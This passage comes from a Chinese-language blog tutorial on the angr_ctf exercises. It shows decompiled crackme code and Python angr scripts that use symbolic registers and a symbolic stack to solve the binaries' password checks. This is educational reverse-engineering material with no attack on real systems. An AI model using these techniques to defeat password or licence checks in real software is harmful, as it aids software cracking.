class="token number">0x8C9C6B06</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">506201578</span> <span class="token operator">+</span> <span class="token number">1306428696</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x11B9DE9C</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1979576599</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF1A3C94B</span><span class="token punctuation">)</span>           <span class="token operator">+</span> <span class="token number">1419260309</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x92896C8</span><span class="token punctuation">)</span>         <span class="token operator">-</span> <span class="token number">383475520</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xA2B0AE1F</span><span class="token punctuation">)</span>       <span class="token operator">-</span> <span class="token number">963798047</span>       <span class="token operator">+</span> <span class="token number">2098953909</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0xFA55CC03</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1408082538</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF637E394</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1155370027</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC6F7A83A</span><span class="token punctuation">)</span>                     <span class="token operator">-</span> <span class="token number">286307825</span>                     <span class="token operator">+</span> <span class="token number">847018205</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9E46424</span><span class="token punctuation">)</span>                   <span class="token operator">+</span> <span class="token number">829215924</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xD0D3A782</span><span class="token punctuation">)</span>                 <span class="token operator">+</span> <span class="token number">267178483</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6595F087</span><span class="token punctuation">)</span>               <span class="token operator">+</span> <span class="token number">1151870818</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8529CCF3</span><span class="token punctuation">)</span>             <span class="token operator">-</span> <span class="token number">2092276806</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xCBDB3CE1</span><span class="token punctuation">)</span>           <span class="token operator">-</span> <span class="token number">1204004829</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6E55C638</span><span class="token punctuation">)</span>         <span class="token operator">+</span> <span class="token number">1720283269</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xAEFB68D3</span><span class="token punctuation">)</span>       <span class="token operator">+</span> <span class="token number">1956986548</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_3</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0xFD2D6C3F</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">831184883</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6633C3C9</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">358411895</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC4FF8776</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">763680393</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xEAE4DB7B</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token number">954507130</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF35005F6</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序对用户输入的三个值进行了不同的三种变换，最终需要变换后的三个变量同时满足为<code>false</code>，其实本质上和之前的题一样，我们依然能用之前的方法解决，代码如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">basic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'03_angr_symbolic_registers'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># Define a function that checks if you have found the state you are looking</span>    <span class="token comment"># for.</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Dump whatever has been printed out by the binary so far into a string.</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># Return whether 'Good Job.' has been printed yet.</span>        <span class="token comment"># (!)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>        <span class="token comment"># return True if b'Good Job.' in stdout_output else False</span>        <span class="token comment"># Same as above, but this time check if the state should abort. If you return</span>        <span class="token comment"># False, Angr will continue to step the state. In this specific challenge, the</span>        <span class="token comment"># only time at which you will know you should abort is when the program prints</span>        <span class="token comment"># "Try again."</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token comment"># Tell Angr to explore the binary and find any state that is_successful identfies</span>    <span class="token comment"># as a successful state by returning True.</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    basic<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502101525.png" alt=""></p><p>这部分代码应该很熟练了，但总是用那三板斧，遇到更加复杂的问题可能就抡不动了。本题实际上是希望我们学会利用angr来实现对寄存器中值的操作。</p><ul><li>需要控制的变量在<code>get_user_input</code> 输入部分，我们看下该本部分的汇编代码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502102553.png" alt=""></p><blockquote><p>获取了三个输入，并分别保存到了<code>eax</code>,<code>ebx</code>,<code>edx</code>寄存器中(<strong>注意第一个改变寄存器值相应的内存地址<code>0804881E</code>，后面用到</strong>)，意味着我们如果能修改寄存器的值，那么直接修改这三个寄存器，就不需要从main函数入口进入了，恰巧angr就支持这种操作。除了从汇编代码，也可以从反编译后的注释中发现传入的三个变量存储的寄存器</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502102840.png" alt=""></p></blockquote><ul><li>当我们不从main函数入口进入时，在初始化<code>state</code>的时候就不用<code>entry_state()</code>了，改用<code>blank_state()</code>，它用于创建一个空的状态，因为我们是“空降”到程序的某一位置的，此时程序所有的状态需要我们自己指定，下表解释了常用的状态构造方法<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="AngrCTF_FITM/Angr_CTF从入门到精通（一）.md at master · ZERO-A-ONE/AngrCTF_FITM (github.com)">[1]</span></a></sup>：</li></ul><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><code>entry_state()</code></td><td>构造一个已经准备好从函数入口点(<code>main</code>)执行的状态</td></tr><tr><td><code>blank_state()</code></td><td>构造一个“空状态”，它的大多数数据都是未初始化的。当使用未初始化的的数据时，一个不受约束的符号值将会被返回，<strong>记住当需要从程序中任意一点执行的时候使用</strong></td></tr><tr><td><code>call_state()</code></td><td>构造一个已经准备好执行某个函数的状态</td></tr><tr><td><code>full_init_state()</code></td><td>构造一个已经执行过所有与需要执行的初始化函数，并准备从函数入口点执行的状态。比如，共享库构造函数（constructor）或预初始化器。当这些执行完之后，程序将会跳到入口点</td></tr></tbody></table></div><p>有了上面的基础知识后，看题解源码，我会在必要的位置添加注释帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripy<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">"03_angr_symbolic_registers"</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment"># 0x0804881E　这个地址是将输入值传入寄存器的起始地址，也是我们需要的“空降”位置</span>    start_address <span class="token operator">=</span> <span class="token number">0x0804881E</span>    <span class="token comment"># 不再是entry_state()了，通过给定的起始地址，在该处创建一个空白状态</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment"># 这里我们需要创建位向量，实际上就是保存寄存器值的变量（变量名称随意），在符号执行中用的符号变量，如\alpha，</span>    <span class="token comment"># 指定32位是因为程序本身是32位的</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>    passwd0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    passwd1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    passwd2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd2'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># 将符号变量存储到寄存器中，在程序模拟执行阶段就由这些符号值代替实际输入执行，以遍历所有路径</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> passwd0    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> passwd1    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> passwd2    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token comment"># 分别对三个符号变量进行约束求解，获取测试用例，format(...,'x')是将16进制转换为字符串</span>        <span class="token comment"># 此处不能像之前一样用.posix.dumps(0)的方式获取终端输入了，因为我们不是从程序入口进入的，</span>        <span class="token comment"># 跳过了输入的部分，因此我们需要通过对自定义的符号变量（位向量）进行约束求解，</span>        <span class="token comment"># 采用.solver.eval(BVS)的方式</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        solution2 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        <span class="token comment"># 下面的se方法也是可行的，但官方已经提示要丢弃使用了，建议还是用上面的</span>        <span class="token comment"># solution0 = format(solution_state.se.eval(passwd0),'x')</span>        <span class="token comment"># solution1 = format(solution_state.se.eval(passwd1),'x')</span>        <span class="token comment"># solution2 = format(solution_state.se.eval(passwd2),'x')</span>        solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution2        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502110615.png" alt="image-20210502110608909"></p><h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>老规矩，扔ida里看下代码</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">handle_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">handle_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u %u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">complex_function0</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">complex_function1</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1087905000</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">135078575</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a1 <span class="token operator">^</span> <span class="token number">0x256BEDF0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a1 <span class="token operator">^</span> <span class="token number">0x9D110FE4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>看起来也没什么差别，用常规方法直接<code>handle</code>是可行的，但是本题考查的是对栈的操作，我们需要直接对栈做变化，然后从一个指定的地方空降到程序中继续执行。看一下ida中汇编代码部分：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502123113.png" alt=""></p><p>可以看到第一个参数是在<code>0x08048697</code>写入栈中的，因此，这个也是我们需要“空降”的地址，我们可以绘制此时的栈：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#            /-------- The stack --------\</span><span class="token comment"># ebp ->     |          padding          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x01 |       more padding        |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .               </span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x09 |   S1, last byte           |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .                    </span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x0c |   S1, first byte          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x0d |   S2, last byte           |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x10 |   S2, first byte          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># esp ->     |                           |</span><span class="token comment">#            \---------------------------/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>当我们要修改栈中内容时，需要将两个变量(S2,S2)写入到栈中，为此，需要先将<code>esp</code>指针抬高，即给要压入的参数（2个参数每个占4字节，一共占用8字节）创建空间，对应汇编代码就是<code>sub esp, 0x08</code></p><p>下面是完整的题解，我会在必要的地方添加注释，帮助理解：</p><blockquote><p>为了与普通方法对比，我将直接通过输出求解的方法<code>basic</code>也加入了其中</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">basic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'04_angr_symbolic_stack'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token comment"># Tell Angr to explore the binary and find any state that is_successful identfies</span>    <span class="token comment"># as a successful state by returning True.</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'04_angr_symbolic_stack'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token 